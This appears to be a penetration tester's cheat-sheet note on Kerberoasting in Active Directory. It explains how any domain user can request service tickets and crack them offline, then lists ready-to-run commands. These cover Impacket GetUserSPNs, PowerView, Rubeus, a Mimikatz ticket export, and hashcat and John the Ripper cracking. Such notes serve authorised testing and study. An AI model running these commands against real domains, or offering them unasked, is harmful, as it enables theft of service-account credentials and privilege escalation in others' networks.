#AD #Attack 
## Info

- **Type:** Credential Extraction / Privilege Escalation
- **Common Usage:** Extract and crack **service account hashes** from Active Directory (AD).
- **Vulnerability:** AD allows **any domain user** to request **service tickets (TGS)** for **service accounts**. If the service account has a **weak password**, the ticket can be cracked offline to recover plaintext credentials.
- **Requires:** A **valid domain user** account.
- **CVE:** No specific CVE; this is a **legitimate feature** of Kerberos that attackers abuse.
## Identifying Kerberoastable Accounts

### Impacket's `GetUserSPNs`

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASSWORD -dc-ip $IP
```

- Finds **service accounts** with **Kerberos SPNs**.

### PowerView (Windows)

```powershell
# Find all user accounts with an SPN (potentially Kerberoastable)
Get-NetUser -SPN
```

### Rubeus (Windows)

```powershell
Rubeus.exe kerberoast
```

## Requesting & Dumping Service Tickets

### With [[Impacket]]

```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASSWORD -dc-ip $IP -request
```

- Retrieves **TGS tickets** in **Kirbi** format.

### With Rubeus

```powershell
Rubeus.exe kerberoast /outfile:hashes.txt
```

### Using Mimikatz

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## Cracking Kerberos Hashes

### With Hashcat

```bash
hashcat -m 13100 hashes.txt /path/to/wordlist
```

- `-m 13100`: Kerberos 5 TGS-REP Hashes

### With John the Ripper

```bash
john --format=krb5tgs --wordlist=/path/to/wordlist hashes.txt
```